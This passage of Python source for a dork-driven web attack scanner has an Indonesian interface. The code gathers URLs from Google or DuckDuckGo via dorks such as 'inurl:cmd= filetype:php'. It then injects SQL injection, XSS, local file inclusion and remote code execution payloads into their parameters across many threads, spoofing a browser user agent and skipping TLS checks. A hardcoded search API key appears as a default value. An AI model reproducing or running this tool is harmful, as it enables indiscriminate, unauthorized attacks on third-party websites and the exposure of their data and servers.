            ))
            injected_urls.append((param, injected_url))
        
        return injected_urls
    else:
        return []


def scan_rce(url, timeout=10, silent=False):
    """Scan for Remote Code Execution vulnerabilities."""
    rce_vulns = []
    tested_params = set()
    
    for payload, expected_output in RCE_PAYLOADS[:25]:
        injected_urls = inject_rce_payload(url, payload)
        
        for param_name, injected_url in injected_urls:
            if param_name in tested_params:
                continue
            
            response_text = test_url(injected_url, timeout)
            
            if response_text:
                is_rce, evidence = detect_rce(response_text, expected_output)
                
                if is_rce:
                    vuln = {
                        'url': injected_url,
                        'parameter': param_name,
                        'payload': payload,
                        'evidence': evidence[:100] if evidence else ''
                    }
                    rce_vulns.append(vuln)
                    with thread_lock:
                        all_rce_vulnerabilities.append(vuln)
                    tested_params.add(param_name)
                    if not silent:
                        with thread_lock:
                            print_rce_vuln(injected_url, param_name, payload, evidence)
                    break
        
        if rce_vulns:
            break
    
    return rce_vulns


def print_lfi_vuln(url, param, file_type, payload):
    """Print LFI vulnerability found."""
    payload_display = payload[:45] if len(payload) > 45 else payload
    print(f"""
    {Fore.GREEN}╔{'═'*66}╗
    ║{Back.GREEN}{Fore.BLACK}  VULNERABLE  {Style.RESET_ALL}{Fore.GREEN}║ LFI (Local File Inclusion) Detected!         ║
    ╠{'═'*66}╣{Style.RESET_ALL}
    {Fore.GREEN}║{Fore.YELLOW} URL:{Style.RESET_ALL} {url[:58]}{'...' if len(url) > 58 else ''}{' ' * max(0, 58 - len(url[:58]))} {Fore.GREEN}║
    {Fore.GREEN}║{Fore.YELLOW} Parameter:{Style.RESET_ALL} {param}{' ' * (51 - len(param))} {Fore.GREEN}║
    {Fore.GREEN}║{Fore.YELLOW} File Type:{Style.RESET_ALL} {file_type}{' ' * (51 - len(file_type))} {Fore.GREEN}║
    {Fore.GREEN}║{Fore.YELLOW} Payload:{Style.RESET_ALL} {payload_display}{' ' * max(0, 53 - len(payload_display))} {Fore.GREEN}║
    {Fore.GREEN}╚{'═'*66}╝{Style.RESET_ALL}
""")


def print_rce_vuln(url, param, payload, evidence):
    """Print RCE vulnerability found."""
    payload_display = payload[:45] if len(payload) > 45 else payload
    evidence_display = (evidence[:45] if evidence and len(evidence) > 45 else evidence) or 'N/A'
    print(f"""
    {Fore.RED}{Back.WHITE}╔{'═'*66}╗
    ║{Back.RED}{Fore.WHITE}  CRITICAL!   {Style.RESET_ALL}{Fore.RED}{Back.WHITE}║ RCE (Remote Code Execution) Detected!        ║
    ╠{'═'*66}╣{Style.RESET_ALL}
    {Fore.RED}║{Fore.YELLOW} URL:{Style.RESET_ALL} {url[:58]}{'...' if len(url) > 58 else ''}{' ' * max(0, 58 - len(url[:58]))} {Fore.RED}║
    {Fore.RED}║{Fore.YELLOW} Parameter:{Style.RESET_ALL} {param}{' ' * (51 - len(param))} {Fore.RED}║
    {Fore.RED}║{Fore.YELLOW} Payload:{Style.RESET_ALL} {payload_display}{' ' * max(0, 53 - len(payload_display))} {Fore.RED}║
    {Fore.RED}║{Fore.YELLOW} Evidence:{Style.RESET_ALL} {evidence_display}{' ' * max(0, 52 - len(evidence_display))} {Fore.RED}║
    {Fore.RED}╚{'═'*66}╝{Style.RESET_ALL}
""")


def inject_payload(url, payload="'"):
    parsed = urllib.parse.urlparse(url)
    
    if parsed.query:
        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        injected_urls = []
        
        for param in params:
            new_params = params.copy()
            original_value = new_params[param][0] if new_params[param] else ''
            new_params[param] = [original_value + payload]
            
            new_query = urllib.parse.urlencode(new_params, doseq=True)
            injected_url = urllib.parse.urlunparse((
                parsed.scheme,
                parsed.netloc,
                parsed.path,
                parsed.params,
                new_query,
                parsed.fragment
            ))
            injected_urls.append((param, injected_url))
        
        return injected_urls
    else:
        return [('path', url + payload)]


def test_url(url, timeout=10):
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'close',
        }
        
        response = requests.get(url, headers=headers, timeout=timeout, verify=False, allow_redirects=True)
        return response.text
    except requests.exceptions.Timeout:
        return None
    except requests.exceptions.ConnectionError:
        return None
    except Exception:
        return None


def scan_url(url, timeout=10, silent=False, include_blind=True):
    vulnerabilities = []
    xss_vulns = []
    dom_vulns = []
    blind_vulns = []
    
    if not silent:
        with thread_lock:
            print_info(f"{Fore.CYAN}[Error-based SQL Injection Scan]{Style.RESET_ALL}")
    
    injected_urls = inject_payload(url)
    
    for param_name, injected_url in injected_urls:
        if not silent:
            with thread_lock:
                print_info(f"Testing parameter: {Fore.YELLOW}{param_name}{Style.RESET_ALL}")
        
        response_text = test_url(injected_url, timeout)
        
        if response_text:
            db_type, error_snippet = detect_sql_error(response_text)
            
            if db_type:
                vuln = {
                    'url': injected_url,
                    'parameter': param_name,
                    'db_type': db_type,
                    'error': error_snippet
                }
                vulnerabilities.append(vuln)
                with thread_lock:
                    all_vulnerabilities.append(vuln)
                if not silent:
                    with thread_lock:
                        print_vuln(injected_url, db_type, error_snippet)
    
    if include_blind and not vulnerabilities:
        if not silent:
            with thread_lock:
                print_info(f"{Fore.CYAN}[Blind SQL Injection Scan]{Style.RESET_ALL}")
        
        blind_vulns = detect_blind_sqli(url, timeout)
        
        for vuln in blind_vulns:
            if not silent:
                with thread_lock:
                    print_blind_sqli_vuln(vuln['url'], vuln['parameter'], vuln['type'])
    
    if not silent:
        with thread_lock:
            print_info(f"{Fore.MAGENTA}[Reflected XSS Scan]{Style.RESET_ALL}")
    
    xss_vulns = scan_xss(url, timeout, silent)
    
    if not silent:
        with thread_lock:
            print_info(f"{Fore.YELLOW}[DOM-based XSS Scan]{Style.RESET_ALL}")
    
    dom_vulns = scan_dom_xss(url, timeout, silent)
    
    if not silent:
        with thread_lock:
            print_info(f"{Fore.GREEN}[LFI (Local File Inclusion) Scan]{Style.RESET_ALL}")
    
    lfi_vulns = scan_lfi(url, timeout, silent)
    
    if not silent:
        with thread_lock:
            print_info(f"{Fore.RED}[RCE (Remote Code Execution) Scan]{Style.RESET_ALL}")
    
    rce_vulns = scan_rce(url, timeout, silent)
    
    return vulnerabilities, blind_vulns, xss_vulns, dom_vulns, lfi_vulns, rce_vulns


def scan_url_threaded(url, timeout=10):
    return scan_url(url, timeout, silent=True)


def multi_threaded_scan(urls, timeout=10, num_threads=5):
    results = {
        'sql_vulns': 0,
        'blind_vulns': 0,
        'xss_vulns': 0,
        'dom_vulns': 0,
        'lfi_vulns': 0,
        'rce_vulns': 0,
        'scanned': 0
    }
    
    def scan_worker(url):
        try:
            sql, blind, xss, dom, lfi, rce = scan_url_threaded(url, timeout)
            return len(sql), len(blind), len(xss), len(dom), len(lfi), len(rce), url
        except Exception:
            return 0, 0, 0, 0, 0, 0, url
    
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = {executor.submit(scan_worker, url): url for url in urls}
        
        for future in as_completed(futures):
            try:
                sql_count, blind_count, xss_count, dom_count, lfi_count, rce_count, scanned_url = future.result()
                results['sql_vulns'] += sql_count
                results['blind_vulns'] += blind_count
                results['xss_vulns'] += xss_count
                results['dom_vulns'] += dom_count
                results['lfi_vulns'] += lfi_count
                results['rce_vulns'] += rce_count
                results['scanned'] += 1
                
                with thread_lock:
                    progress_bar(results['scanned'], len(urls), f"{Fore.CYAN}Scanning{Style.RESET_ALL}")
                    
                    status_parts = []
                    if sql_count > 0:
                        status_parts.append(f"{Fore.RED}SQLi:{sql_count}{Style.RESET_ALL}")
                    if blind_count > 0:
                        status_parts.append(f"{Fore.RED}Blind:{blind_count}{Style.RESET_ALL}")
                    if xss_count > 0:
                        status_parts.append(f"{Fore.MAGENTA}XSS:{xss_count}{Style.RESET_ALL}")
                    if dom_count > 0:
                        status_parts.append(f"{Fore.YELLOW}DOM:{dom_count}{Style.RESET_ALL}")
                    if lfi_count > 0:
                        status_parts.append(f"{Fore.GREEN}LFI:{lfi_count}{Style.RESET_ALL}")
                    if rce_count > 0:
                        status_parts.append(f"{Fore.RED}{Back.WHITE}RCE:{rce_count}{Style.RESET_ALL}")
                    
                    if status_parts:
                        print(f"\n    {Fore.GREEN}[+]{Style.RESET_ALL} {scanned_url[:50]}... [{', '.join(status_parts)}]")
                    else:
                        print(f"\n    {Fore.BLUE}[-]{Style.RESET_ALL} {scanned_url[:60]}...")
                        
            except Exception:
                results['scanned'] += 1
    
    return results


def search_dork(dork, num_results=100, engine="google"):
    try:
        unique_urls = set()
        results_per_page = 10
        total_pages = (num_results + results_per_page - 1) // results_per_page
        
        scraper_api_key = os.environ.get("SCRAPER_API_KEY", "1820c54a47ebf6d3557d9be57aa70c81")
        
        if engine == "google":
            print_info(f"Menggunakan {Fore.GREEN}Google{Style.RESET_ALL} dengan ScraperAPI...")
            search = GoogleSearch(scraper_api_key=scraper_api_key)
            engine_name = "Google"
        elif engine == "duckduckgo":
            print_info(f"Menggunakan {Fore.YELLOW}DuckDuckGo{Style.RESET_ALL} dengan ScraperAPI...")
            search = DuckDuckGoSearch(scraper_api_key=scraper_api_key)
            engine_name = "DuckDuckGo"
        else:
            print_error(f"Mesin pencari tidak dikenal: {engine}")
            return []
        
        no_new_results_count = 0
        
        for page in range(1, total_pages + 1):
            loading_animation(f"Mencari di {engine_name}... (Halaman {page}/{total_pages})", 1)
            try:
                results = search.search(dork, num_results=results_per_page, page=page)
                
                urls_before = len(unique_urls)
                
                for result in results:
                    url = None
                    if hasattr(result, 'url'):
                        url = result.url
                    elif isinstance(result, dict) and 'url' in result:
                        url = result['url']
                    elif isinstance(result, str):
                        url = result
                    
                    if url:
                        unique_urls.add(url)
                
                new_urls = len(unique_urls) - urls_before
                
                if new_urls > 0:
                    print_info(f"Halaman {page}: +{Fore.GREEN}{new_urls}{Style.RESET_ALL} URL baru (Total: {Fore.YELLOW}{len(unique_urls)}{Style.RESET_ALL})")
                    no_new_results_count = 0
                else:
                    print_warning(f"Halaman {page}: Tidak ada URL baru (Total: {len(unique_urls)})")
                    no_new_results_count += 1
                
                if len(unique_urls) >= num_results:
                    print_success(f"Target {num_results} URL tercapai!")
                    break
                
                if no_new_results_count >= 3:
                    print_warning(f"3 halaman berturut-turut tanpa hasil baru, menghentikan pencarian...")
                    break
                    
                if len(results) < results_per_page:
                    print_info(f"Hasil pencarian habis di halaman {page}")
                    break
                    
            except Exception as e:
                print_warning(f"Halaman {page} error: {str(e)}")
                continue
        
        urls = list(unique_urls)
        urls = filter_urls(urls)
        urls = urls[:num_results]
        
        print_success(f"Total ditemukan {Fore.YELLOW}{len(urls)}{Style.RESET_ALL} URL unik setelah filter")
        return urls
    except Exception as e:
        print_error(f"Search error: {str(e)}")
        return []


def select_search_engine():
    """Prompt user to select search engine."""
    print(f"""
    {Fore.CYAN}╔════════════════════════════════════════════════════════════════════╗
    ║  {Fore.YELLOW}◆  PILIH MESIN PENCARI{Fore.CYAN}                                            ║
    ╠════════════════════════════════════════════════════════════════════╣
    ║  {Fore.YELLOW}[1]{Fore.WHITE} Google       {Fore.GREEN}(dengan ScraperAPI){Fore.CYAN}                            ║
    ║  {Fore.YELLOW}[2]{Fore.WHITE} DuckDuckGo   {Fore.GREEN}(dengan ScraperAPI){Fore.CYAN}                            ║
    ╚════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}""")
    
    engine_choice = input(f"    {Fore.YELLOW}➤{Style.RESET_ALL} Pilih mesin pencari [1/2]: ").strip()
    
    if engine_choice == "2":
        return "duckduckgo"
    return "google"


def menu_dork_scan():
    clear_screen()
    print_banner()
    
    print(f"""
    {Fore.CYAN}╔════════════════════════════════════════════════════════════════════╗
    ║  {Fore.YELLOW}◆  DORK SCANNER{Fore.CYAN}                                                   ║
    ╠════════════════════════════════════════════════════════════════════╣
    ║  {Fore.YELLOW}[1]{Fore.WHITE} Masukkan Dork Manual                                        {Fore.CYAN}║
    ║  {Fore.YELLOW}[2]{Fore.WHITE} Lihat Sample Dorks                                          {Fore.CYAN}║
    ║  {Fore.YELLOW}[0]{Fore.WHITE} Kembali                                                     {Fore.CYAN}║
    ╚════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}""")
    
    choice = input(f"    {Fore.YELLOW}➤{Style.RESET_ALL} Pilih opsi: ").strip()
    
    if choice == '0':
        return
    
    if choice == '2':
        menu_sample_dorks()
        return
    
    print(f"\n    {Fore.WHITE}Contoh dork:{Style.RESET_ALL}")
    print(f"    {Fore.GREEN}•{Style.RESET_ALL} inurl:php?id=")
    print(f"    {Fore.GREEN}•{Style.RESET_ALL} inurl:page= filetype:php (LFI)")
    print(f"    {Fore.GREEN}•{Style.RESET_ALL} inurl:cmd= filetype:php (RCE)")
    print()
    
    dork = input(f"    {Fore.YELLOW}➤{Style.RESET_ALL} Masukkan Dork: ").strip()
    
    if not dork:
        print_error("Dork tidak boleh kosong!")
        input(f"\n    {Fore.CYAN}Tekan Enter untuk kembali...{Style.RESET_ALL}")
        return
    
    engine = select_search_engine()
    run_dork_scan(dork, engine)


def menu_sample_dorks():
    """Display sample dorks by category."""
    clear_screen()
    print_banner()
    
    print(f"""
    {Fore.CYAN}╔════════════════════════════════════════════════════════════════════╗
    ║  {Fore.YELLOW}◆  SAMPLE DORKS BY CATEGORY{Fore.CYAN}                                       ║
    ╠════════════════════════════════════════════════════════════════════╣""")
    
    categories = list(SAMPLE_DORKS.keys())
    for i, category in enumerate(categories, 1):
        print(f"    {Fore.CYAN}║  {Fore.YELLOW}[{i}]{Fore.WHITE} {category:<60}{Fore.CYAN}║")
    
    print(f"""    {Fore.CYAN}╠════════════════════════════════════════════════════════════════════╣
    ║  {Fore.YELLOW}[0]{Fore.WHITE} Kembali                                                     {Fore.CYAN}║
    ╚════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}""")
    
    choice = input(f"    {Fore.YELLOW}➤{Style.RESET_ALL} Pilih kategori: ").strip()
    
    if choice == '0':
        return
    
    try:
        idx = int(choice) - 1
        if 0 <= idx < len(categories):
            category = categories[idx]
            dorks = SAMPLE_DORKS[category]
            
            clear_screen()
            print_banner()
            print(f"\n    {Fore.CYAN}═══ {category} SAMPLE DORKS ═══{Style.RESET_ALL}\n")
            
            for i, dork in enumerate(dorks, 1):
                print(f"    {Fore.YELLOW}[{i:2}]{Style.RESET_ALL} {dork}")
            
            print()
            dork_choice = input(f"    {Fore.YELLOW}➤{Style.RESET_ALL} Pilih dork (nomor) atau ketik manual: ").strip()
            
            if dork_choice.isdigit():
                dork_idx = int(dork_choice) - 1
                if 0 <= dork_idx < len(dorks):
                    engine = select_search_engine()
                    run_dork_scan(dorks[dork_idx], engine)
                    return
            elif dork_choice:
                engine = select_search_engine()
                run_dork_scan(dork_choice, engine)
                return
    except (ValueError, IndexError):
        pass


def run_dork_scan(dork, engine="google"):
    """Execute dork scan with the given dork."""
    print_divider()
    print_info(f"Mencari: {Fore.YELLOW}{dork}{Style.RESET_ALL}")
    
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    urls = search_dork(dork, settings['num_results'], engine)
    
    if urls:
        print_divider()
        print_info(f"Memulai scan {len(urls)} URL dengan {Fore.GREEN}{settings['threads']} threads{Style.RESET_ALL}")
        print_info(f"Scan: SQLi + XSS + LFI + RCE")
        print()
        
        results = multi_threaded_scan(urls, settings['timeout'], settings['threads'])
        
        print_divider()
        blind_vulns = results.get('blind_vulns', 0)
        lfi_vulns = results.get('lfi_vulns', 0)
        rce_vulns = results.get('rce_vulns', 0)
        total_vulns = results['sql_vulns'] + blind_vulns + results['xss_vulns'] + results['dom_vulns'] + lfi_vulns + rce_vulns
        print(f"""
    {Fore.CYAN}╔{'═'*66}╗
    ║{Fore.GREEN}                      SCAN SELESAI                               {Fore.CYAN}║
    ╠{'═'*66}╣
    ║{Fore.WHITE}  Total URL di-scan    : {Fore.YELLOW}{len(urls):<40}{Fore.CYAN}║
    ║{Fore.WHITE}  SQL Injection Found  : {Fore.RED if results['sql_vulns'] > 0 else Fore.GREEN}{results['sql_vulns']:<40}{Fore.CYAN}║
    ║{Fore.WHITE}  Blind SQLi Found     : {Fore.RED if blind_vulns > 0 else Fore.GREEN}{blind_vulns:<40}{Fore.CYAN}║
    ║{Fore.WHITE}  Reflected XSS Found  : {Fore.MAGENTA if results['xss_vulns'] > 0 else Fore.GREEN}{results['xss_vulns']:<40}{Fore.CYAN}║
    ║{Fore.WHITE}  DOM-based XSS Found  : {Fore.YELLOW if results['dom_vulns'] > 0 else Fore.GREEN}{results['dom_vulns']:<40}{Fore.CYAN}║
    ║{Fore.WHITE}  LFI Found            : {Fore.GREEN if lfi_vulns > 0 else Fore.GREEN}{lfi_vulns:<40}{Fore.CYAN}║
    ║{Fore.WHITE}  RCE Found            : {Fore.RED if rce_vulns > 0 else Fore.GREEN}{rce_vulns:<40}{Fore.CYAN}║
    ╠{'═'*66}╣
    ║{Fore.WHITE}  Total Vulnerability  : {Fore.RED if total_vulns > 0 else Fore.GREEN}{total_vulns:<40}{Fore.CYAN}║
    ╚{'═'*66}╝{Style.RESET_ALL}
""")
    else:
        print_error("Tidak ada URL ditemukan.")
    
    input(f"\n    {Fore.CYAN}Tekan Enter untuk kembali ke menu...{Style.RESET_ALL}")


def menu_single_url():
    clear_screen()
    print_banner()
    
    print(f"""
    {Fore.CYAN}┌────────────────────────────────────────────────────────────────────┐
    │  {Fore.YELLOW}◆  SINGLE URL SCANNER{Fore.CYAN}                                            │
    └────────────────────────────────────────────────────────────────────┘
{Style.RESET_ALL}""")
    
    print(f"    {Fore.WHITE}Contoh URL:{Style.RESET_ALL}")
    print(f"    {Fore.GREEN}•{Style.RESET_ALL} http://example.com/page.php?id=1")
    print(f"    {Fore.GREEN}•{Style.RESET_ALL} http://example.com/product.php?cat=5&id=10")
    print()
    
    url = input(f"    {Fore.YELLOW}➤{Style.RESET_ALL} Masukkan URL target: ").strip()
    
    if not url:
        print_error("URL tidak boleh kosong!")
        input(f"\n    {Fore.CYAN}Tekan Enter untuk kembali...{Style.RESET_ALL}")
        return
    
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    print_divider()
    print_info(f"Target: {Fore.YELLOW}{url}{Style.RESET_ALL}")
    
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    loading_animation("Menyiapkan scan (SQLi + XSS + LFI + RCE)...", 1)
    
    sql_vulns, blind_vulns, xss_vulns, dom_vulns, lfi_vulns, rce_vulns = scan_url(url, settings['timeout'])
    
    print_divider()
    total_vulns = len(sql_vulns) + len(blind_vulns) + len(xss_vulns) + len(dom_vulns) + len(lfi_vulns) + len(rce_vulns)
    if total_vulns > 0:
        print_success(f"Ditemukan: {Fore.RED}{len(sql_vulns)}{Style.RESET_ALL} SQLi, {Fore.RED}{len(blind_vulns)}{Style.RESET_ALL} Blind, {Fore.MAGENTA}{len(xss_vulns)}{Style.RESET_ALL} XSS, {Fore.YELLOW}{len(dom_vulns)}{Style.RESET_ALL} DOM, {Fore.GREEN}{len(lfi_vulns)}{Style.RESET_ALL} LFI, {Fore.RED}{len(rce_vulns)}{Style.RESET_ALL} RCE")
    else:
        print_warning("Tidak ada vulnerability ditemukan.")
    
    input(f"\n    {Fore.CYAN}Tekan Enter untuk kembali ke menu...{Style.RESET_ALL}")


def menu_view_results():
    clear_screen()
    print_banner()
    
    print(f"""
    {Fore.CYAN}╔════════════════════════════════════════════════════════════════════╗
    ║  {Fore.YELLOW}◆  HASIL VULNERABILITY SCAN{Fore.CYAN}                                        ║
    ╚════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}""")
    
    total_vulns = (len(all_vulnerabilities) + len(all_blind_sqli_vulnerabilities) + 
                   len(all_xss_vulnerabilities) + len(all_dom_xss_vulnerabilities) +
                   len(all_lfi_vulnerabilities) + len(all_rce_vulnerabilities))
    
    if total_vulns == 0:
        print_warning("Belum ada vulnerability yang ditemukan.")
        print_info("Lakukan scan terlebih dahulu untuk melihat hasil.")
    else:
        print(f"""
    {Fore.CYAN}╔════════════════════════════════════════════════════════════════════╗
    ║  {Fore.WHITE}RINGKASAN VULNERABILITY{Fore.CYAN}                                            ║
    ╠════════════════════════════════════════════════════════════════════╣
    ║  {Fore.RED}■ SQL Injection     : {len(all_vulnerabilities):<5}{Fore.WHITE} [CRITICAL] Akses database langsung{Fore.CYAN}       ║
    ║  {Fore.RED}■ Blind SQLi        : {len(all_blind_sqli_vulnerabilities):<5}{Fore.WHITE} [CRITICAL] Ekstraksi data tersembunyi{Fore.CYAN}    ║
    ║  {Fore.MAGENTA}■ Reflected XSS     : {len(all_xss_vulnerabilities):<5}{Fore.WHITE} [HIGH] Eksekusi script di browser{Fore.CYAN}        ║
    ║  {Fore.YELLOW}■ DOM-based XSS     : {len(all_dom_xss_vulnerabilities):<5}{Fore.WHITE} [HIGH] Manipulasi DOM client-side{Fore.CYAN}       ║
    ║  {Fore.GREEN}■ LFI               : {len(all_lfi_vulnerabilities):<5}{Fore.WHITE} [CRITICAL] Baca file server{Fore.CYAN}              ║
    ║  {Fore.RED}{Back.WHITE}■ RCE               : {len(all_rce_vulnerabilities):<5}{Style.RESET_ALL}{Fore.WHITE} [CRITICAL] Eksekusi perintah sistem{Fore.CYAN}    ║
    ╠════════════════════════════════════════════════════════════════════╣
    ║  {Fore.WHITE}TOTAL VULNERABILITY : {Fore.RED}{total_vulns:<47}{Fore.CYAN}║
    ╚════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}""")
        
        if all_vulnerabilities:
            print(f"""
    {Fore.RED}╔════════════════════════════════════════════════════════════════════╗
    ║  {Fore.WHITE}SQL INJECTION VULNERABILITIES{Fore.RED}                  {Fore.WHITE}Severity: CRITICAL{Fore.RED} ║
    ║  {Fore.YELLOW}Risiko: Attacker dapat membaca, mengubah, atau menghapus database{Fore.RED}  ║
    ╚════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}""")
            for i, vuln in enumerate(all_vulnerabilities, 1):
                error_clean = vuln['error'].replace('\n', ' ').replace('\r', '')[:100]
                print(f"""
    {Fore.RED}┌─ SQLi-{i} ──────────────────────────────────────────────────────────┐{Style.RESET_ALL}
    {Fore.WHITE}│ URL       :{Style.RESET_ALL} {vuln['url'][:60]}{'...' if len(vuln['url']) > 60 else ''}
    {Fore.WHITE}│ Parameter :{Style.RESET_ALL} {Fore.YELLOW}{vuln['parameter']}{Style.RESET_ALL}
    {Fore.WHITE}│ Database  :{Style.RESET_ALL} {Fore.CYAN}{vuln['db_type']}{Style.RESET_ALL}
    {Fore.WHITE}│ Error Msg :{Style.RESET_ALL} {Fore.RED}{error_clean}...{Style.RESET_ALL}
    {Fore.RED}└────────────────────────────────────────────────────────────────────┘{Style.RESET_ALL}""")
        
        if all_blind_sqli_vulnerabilities:
            print(f"""
    {Fore.RED}╔════════════════════════════════════════════════════════════════════╗
    ║  {Fore.WHITE}BLIND SQL INJECTION VULNERABILITIES{Fore.RED}            {Fore.WHITE}Severity: CRITICAL{Fore.RED} ║
    ║  {Fore.YELLOW}Risiko: Data extraction melalui respons waktu/boolean{Fore.RED}              ║
    ╚════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}""")
            for i, vuln in enumerate(all_blind_sqli_vulnerabilities, 1):
                print(f"""
    {Fore.RED}┌─ Blind-{i} ─────────────────────────────────────────────────────────┐{Style.RESET_ALL}
    {Fore.WHITE}│ URL       :{Style.RESET_ALL} {vuln['url'][:60]}{'...' if len(vuln['url']) > 60 else ''}
    {Fore.WHITE}│ Parameter :{Style.RESET_ALL} {Fore.YELLOW}{vuln['parameter']}{Style.RESET_ALL}
    {Fore.WHITE}│ Type      :{Style.RESET_ALL} {Fore.CYAN}{vuln['type']}{Style.RESET_ALL}
    {Fore.WHITE}│ Technique :{Style.RESET_ALL} {Fore.MAGENTA}{'Time-based' if 'Time' in vuln['type'] else 'Boolean-based'} inference{Style.RESET_ALL}
    {Fore.RED}└────────────────────────────────────────────────────────────────────┘{Style.RESET_ALL}""")
        
        if all_xss_vulnerabilities:
            print(f"""
    {Fore.MAGENTA}╔════════════════════════════════════════════════════════════════════╗
    ║  {Fore.WHITE}REFLECTED XSS VULNERABILITIES{Fore.MAGENTA}                     {Fore.WHITE}Severity: HIGH{Fore.MAGENTA} ║
    ║  {Fore.YELLOW}Risiko: Session hijacking, cookie theft, phishing{Fore.MAGENTA}                 ║
    ╚════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}""")
            for i, vuln in enumerate(all_xss_vulnerabilities, 1):
                payload_display = vuln['payload'][:50] if len(vuln['payload']) > 50 else vuln['payload']
                print(f"""
    {Fore.MAGENTA}┌─ XSS-{i} ───────────────────────────────────────────────────────────┐{Style.RESET_ALL}
    {Fore.WHITE}│ URL       :{Style.RESET_ALL} {vuln['url'][:60]}{'...' if len(vuln['url']) > 60 else ''}
    {Fore.WHITE}│ Parameter :{Style.RESET_ALL} {Fore.YELLOW}{vuln['parameter']}{Style.RESET_ALL}
    {Fore.WHITE}│ XSS Type  :{Style.RESET_ALL} {Fore.CYAN}{vuln['xss_type']}{Style.RESET_ALL}
    {Fore.WHITE}│ Payload   :{Style.RESET_ALL} {Fore.RED}{payload_display}{Style.RESET_ALL}
    {Fore.MAGENTA}└────────────────────────────────────────────────────────────────────┘{Style.RESET_ALL}""")
        
        if all_dom_xss_vulnerabilities:
            print(f"""
    {Fore.YELLOW}╔════════════════════════════════════════════════════════════════════╗
    ║  {Fore.WHITE}DOM-BASED XSS VULNERABILITIES{Fore.YELLOW}                     {Fore.WHITE}Severity: HIGH{Fore.YELLOW} ║
    ║  {Fore.WHITE}Risiko: Client-side code execution melalui manipulasi DOM{Fore.YELLOW}         ║
    ╚════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}""")
            for i, vuln in enumerate(all_dom_xss_vulnerabilities, 1):
                source_clean = vuln['source'].replace('\\', '')
                sink_clean = vuln['sink'].replace('\\', '').replace('s*', '').replace('(', '')
                print(f"""
    {Fore.YELLOW}┌─ DOM-{i} ───────────────────────────────────────────────────────────┐{Style.RESET_ALL}
    {Fore.WHITE}│ URL       :{Style.RESET_ALL} {vuln['url'][:60]}{'...' if len(vuln['url']) > 60 else ''}
    {Fore.WHITE}│ Source    :{Style.RESET_ALL} {Fore.CYAN}{source_clean}{Style.RESET_ALL} {Fore.WHITE}(data masuk dari sini){Style.RESET_ALL}
    {Fore.WHITE}│ Sink      :{Style.RESET_ALL} {Fore.RED}{sink_clean}{Style.RESET_ALL} {Fore.WHITE}(dieksekusi di sini){Style.RESET_ALL}
    {Fore.WHITE}│ Flow      :{Style.RESET_ALL} {Fore.YELLOW}{source_clean} → {sink_clean}{Style.RESET_ALL}
    {Fore.YELLOW}└────────────────────────────────────────────────────────────────────┘{Style.RESET_ALL}""")
        
        if all_lfi_vulnerabilities:
            print(f"""
    {Fore.GREEN}╔════════════════════════════════════════════════════════════════════╗
    ║  {Fore.WHITE}LFI (LOCAL FILE INCLUSION) VULNERABILITIES{Fore.GREEN}       {Fore.WHITE}Severity: CRITICAL{Fore.GREEN} ║
    ║  {Fore.YELLOW}Risiko: Baca file sensitif server (passwd, config, source code){Fore.GREEN}   ║
    ╚════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}""")
            for i, vuln in enumerate(all_lfi_vulnerabilities, 1):
                payload_display = vuln['payload'][:45] if len(vuln['payload']) > 45 else vuln['payload']
                print(f"""
    {Fore.GREEN}┌─ LFI-{i} ───────────────────────────────────────────────────────────┐{Style.RESET_ALL}
    {Fore.WHITE}│ URL       :{Style.RESET_ALL} {vuln['url'][:60]}{'...' if len(vuln['url']) > 60 else ''}
    {Fore.WHITE}│ Parameter :{Style.RESET_ALL} {Fore.YELLOW}{vuln['parameter']}{Style.RESET_ALL}
    {Fore.WHITE}│ File Type :{Style.RESET_ALL} {Fore.CYAN}{vuln['file_type']}{Style.RESET_ALL}
    {Fore.WHITE}│ Payload   :{Style.RESET_ALL} {Fore.RED}{payload_display}{Style.RESET_ALL}
    {Fore.WHITE}│ Impact    :{Style.RESET_ALL} {Fore.MAGENTA}Dapat membaca file sensitif di server{Style.RESET_ALL}
    {Fore.GREEN}└────────────────────────────────────────────────────────────────────┘{Style.RESET_ALL}""")
        
        if all_rce_vulnerabilities:
            print(f"""
    {Fore.RED}{Back.WHITE}╔════════════════════════════════════════════════════════════════════╗
    ║  {Fore.BLACK}RCE (REMOTE CODE EXECUTION) VULNERABILITIES    Severity: CRITICAL{Fore.RED}{Back.WHITE} ║
    ║  {Fore.BLACK}Risiko: FULL SYSTEM COMPROMISE - Eksekusi perintah di server!{Fore.RED}{Back.WHITE}      ║
    ╚════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}""")
            for i, vuln in enumerate(all_rce_vulnerabilities, 1):
                payload_display = vuln['payload'][:40] if len(vuln['payload']) > 40 else vuln['payload']
                evidence_display = vuln.get('evidence', 'Command executed')[:40]
                print(f"""
    {Fore.RED}┌─ RCE-{i} ───────────────────────────────────────────────────────────┐{Style.RESET_ALL}
    {Fore.WHITE}│ URL       :{Style.RESET_ALL} {vuln['url'][:60]}{'...' if len(vuln['url']) > 60 else ''}
    {Fore.WHITE}│ Parameter :{Style.RESET_ALL} {Fore.YELLOW}{vuln['parameter']}{Style.RESET_ALL}
    {Fore.WHITE}│ Payload   :{Style.RESET_ALL} {Fore.RED}{payload_display}{Style.RESET_ALL}
    {Fore.WHITE}│ Evidence  :{Style.RESET_ALL} {Fore.GREEN}{evidence_display}{Style.RESET_ALL}
